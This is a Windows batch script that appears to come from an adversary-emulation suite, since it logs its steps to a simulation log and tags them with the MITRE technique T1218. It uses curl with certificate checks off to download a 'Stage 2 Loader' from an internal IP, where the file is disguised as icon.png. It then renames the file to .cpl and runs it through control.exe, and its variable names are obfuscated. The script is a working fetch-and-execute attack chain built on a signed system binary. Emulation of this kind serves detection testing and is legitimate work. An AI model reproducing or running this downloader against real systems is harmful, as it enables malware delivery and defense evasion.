@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET variables, 8-12 chars, mixed case)
SET a1B2c3D4=%APPDATA%\11420\b3a2de0c
SET e5F6g7H8=2c0ac2b7.txt
SET i9J0k1L2=https://10.0.0.49/stage/2/icon.png?11420-7
SET m3N4o5P6=BALAM-S2B
SET q7R8s9T0=11420
SET u1V2w3X4=7
SET y5Z6a7B8=%PUBLIC%\\macula-simulations.log
SET c9D0e1F2=https://10.0.0.49

REM Cache timestamp for debug lines (simple DATE/TIME string)
SET tsvar=!DATE!/!TIME!

REM Debug log path
SET logfile=!y5Z6a7B8!

REM ===== STEP 1: Heartbeat fetch (download Stage 2 Loader) with retry (max 5) =====
SET max_retries=5
SET retry_count=0
:download_loop
IF !retry_count! GEQ !max_retries! (
    echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_exceeded_retries>> "!logfile!" 2>nul
    goto :skip_download
)
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!a1B2c3D4!\!e5F6g7H8!" "!i9J0k1L2!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_fail=!ERRORLEVEL!>> "!logfile!" 2>nul
    set /a retry_count+=1
    timeout /t 2 /nobreak >nul
    goto :download_loop
) ELSE (
    echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_complete>> "!logfile!" 2>nul
)
:skip_download

REM ===== STEP 2: Change working directory to output directory =====
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_start>> "!logfile!" 2>nul
cd /d "!a1B2c3D4!" >nul 2>&1
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_result=!ERRORLEVEL!>> "!logfile!" 2>nul

REM ===== STEP 3: Rename downloaded file to .cpl and invoke via control.exe =====
REM Get base filename without extension
FOR %%i IN ("!e5F6g7H8!") DO SET base_cpl=%%~ni
ren "!e5F6g7H8!" "!base_cpl!.cpl"
IF !ERRORLEVEL! NEQ 0 (
    echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: rename_fail=!ERRORLEVEL!>> "!logfile!" 2>nul
    goto :skip_control
)
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: rename_complete>> "!logfile!" 2>nul

REM Invoke control.exe with absolute path
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: controlexec_start>> "!logfile!" 2>nul
control.exe "!a1B2c3D4!\!base_cpl!.cpl"
SET ctrl_result=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: controlexec_result=!ctrl_result!>> "!logfile!" 2>nul

:skip_control

REM ===== STEP 4: Logging (TTP event) =====
REM Generate precise timestamp with milliseconds for TTP line
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do set ttp_timestamp=%date% %%a:%%b:%%c.%%d
SET ttp_result=OK
SET ttp_error=
IF !ctrl_result! NEQ 0 (
    SET ttp_result=FAIL
    SET ttp_error=EXITCODE=!ctrl_result!
)
echo [!ttp_timestamp!][TTP][!m3N4o5P6!][!q7R8s9T0!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!logfile!" 2>nul

ENDLOCAL
exit /b 0